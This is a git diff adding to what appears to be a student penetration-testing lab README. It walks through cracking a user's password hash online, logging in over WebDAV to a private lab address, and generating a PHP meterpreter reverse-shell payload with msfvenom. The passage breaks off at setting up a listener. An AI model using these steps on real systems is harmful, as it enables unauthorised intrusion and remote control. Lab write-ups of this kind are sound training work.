@@ -43,4 +43,35 @@ Project demostrating my knowledge in defensive security, and pentration testing 
 - We can see that Ashton's password is *leopoldo*
 - Going back to the *company_folders/secret_folder* enter the information that we found.
 
-- 
+- Once inside the directory navigate the the *connect_to_corp_server* We find instructions on how to connect to the server via **WebDAV**
+- We can also see ryan's password hash.
+![webdav instructions](Imaages/web-dav-dir.png)
+
+## Connect to the server via WebDAV
+
+- Using ryan's password hash we can either put the hash into a file with the proper format and use `john`, or we can use *https://crackstation.net* to crack the passwod. In this case we will be using *crackstation*.
+
+-Naviage to *https://crackstation.net* and enter the hash into the text box.
+
+![Crackstation](Images/crackstation_psswd_hash.png)
+
+- The password is revealed as: `linux4u`
+
+## Connect to the server via WebDAV
+
+- In order to connect to the webserver via WebDAV we need to do as follows.
+  1. Open the **File System** from the desktop
+  2. Click **Browse Network**
+  3. In the URL bar, type: `dav://192.168.1.105/webdav` and enter ryans credentials to log in.
+![Webdav-login](Images/webdav_login.png)
+
+## Upload a PHP reverse shell payload
+
+- We start by creating the payload using **msfvenom**.
+
+- `msfvenom -p php/meterpreter/reverse_tcp lhost=192.168.1.90 lport=4444 > shell.php`
+
+![msf-payload](Images/msf-payload.png)
+
+- On the Kali machine we need to set up a listener.
+  
